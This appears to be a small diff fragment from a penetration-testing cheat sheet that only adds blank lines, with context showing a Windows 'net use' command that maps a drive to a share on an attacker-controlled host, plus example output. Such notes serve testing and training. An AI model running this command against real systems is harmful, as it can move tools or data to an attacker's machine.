@@ -23,3 +23,5 @@ net use $_DRIVE: \\$_ATTACKER_IP\$_SHARE
 C:\>net use X: \\10.10.10.100\files
 The command completed successfully.
 ```
+
+
